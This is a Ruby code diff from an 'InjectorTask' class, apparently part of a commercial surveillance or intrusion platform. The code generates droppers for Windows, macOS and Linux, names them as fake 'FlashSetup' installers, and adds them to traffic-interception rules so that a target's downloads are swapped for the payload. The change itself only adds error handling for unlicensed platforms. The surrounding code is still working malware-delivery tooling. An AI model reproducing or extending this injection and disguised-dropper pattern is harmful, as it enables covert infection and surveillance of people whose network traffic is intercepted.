@@ -184,71 +184,86 @@ class InjectorTask
     appname = 'FlashSetup-11.8.800.' + progressive.to_s
     intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"
 
-    # WINDOWS
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the dropper
-    params = {'factory' => {'_id' => rule.action_param},
-              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-              'melt' => {'admin' => true, 'cooked' => true, 'appname' => appname, 'scout' => rule.scout}
-    }
-    build = Build.factory(:windows)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
+    begin
+      # WINDOWS
+      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+      # generate the dropper
+      params = {'factory' => {'_id' => rule.action_param},
+                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                'melt' => {'admin' => true, 'cooked' => true, 'appname' => appname, 'scout' => rule.scout}
+      }
+      build = Build.factory(:windows)
+      build.create params
+      FileUtils.cp build.path(build.outputs.first), temp_zip
+      build.clean
 
-    # extract the zip
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name.gsub('.cooked', '.windows')] = f_path
+      # extract the zip
+      Zip::File.open(temp_zip) do |z|
+        z.each do |f|
+          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          z.extract(f, f_path) unless File.exist?(f_path)
+          vector_files[f.name.gsub('.cooked', '.windows')] = f_path
+        end
       end
+      FileUtils.rm_rf(temp_zip)
+    rescue Exception => e
+      #raised if no license for that platform
+      trace :error, e.message
     end
-    FileUtils.rm_rf(temp_zip)
 
-    # OSX
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the dropper
-    params = {'factory' => {'_id' => rule.action_param},
-              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-              'melt' => {'admin' => false, 'appname' => appname + '.osx'}
-    }
-    build = Build.factory(:osx)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
+    begin
+      # OSX
+      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+      # generate the dropper
+      params = {'factory' => {'_id' => rule.action_param},
+                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                'melt' => {'admin' => false, 'appname' => appname + '.osx'}
+      }
+      build = Build.factory(:osx)
+      build.create params
+      FileUtils.cp build.path(build.outputs.first), temp_zip
+      build.clean
 
-    # extract the zip
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name] = f_path
+      # extract the zip
+      Zip::File.open(temp_zip) do |z|
+        z.each do |f|
+          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          z.extract(f, f_path) unless File.exist?(f_path)
+          vector_files[f.name] = f_path
+        end
       end
+      FileUtils.rm_rf(temp_zip)
+    rescue Exception => e
+      #raised if no license for that platform
+      trace :error, e.message
     end
-    FileUtils.rm_rf(temp_zip)
 
-    # LINUX
-    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-    # generate the dropper
-    params = {'factory' => {'_id' => rule.action_param},
-              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
-              'melt' => {'admin' => false, 'appname' => appname + '.linux'}
-    }
-    build = Build.factory(:linux)
-    build.create params
-    FileUtils.cp build.path(build.outputs.first), temp_zip
-    build.clean
+    begin
+      # LINUX
+      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+      # generate the dropper
+      params = {'factory' => {'_id' => rule.action_param},
+                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
+                'melt' => {'admin' => false, 'appname' => appname + '.linux'}
+      }
+      build = Build.factory(:linux)
+      build.create params
+      FileUtils.cp build.path(build.outputs.first), temp_zip
+      build.clean
 
-    # extract the zip
-    Zip::File.open(temp_zip) do |z|
-      z.each do |f|
-        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
-        z.extract(f, f_path) unless File.exist?(f_path)
-        vector_files[f.name] = f_path
+      # extract the zip
+      Zip::File.open(temp_zip) do |z|
+        z.each do |f|
+          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
+          z.extract(f, f_path) unless File.exist?(f_path)
+          vector_files[f.name] = f_path
+        end
       end
+      FileUtils.rm_rf(temp_zip)
+    rescue Exception => e
+      #raised if no license for that platform
+      trace :error, e.message
     end
-    FileUtils.rm_rf(temp_zip)
 
   end
 
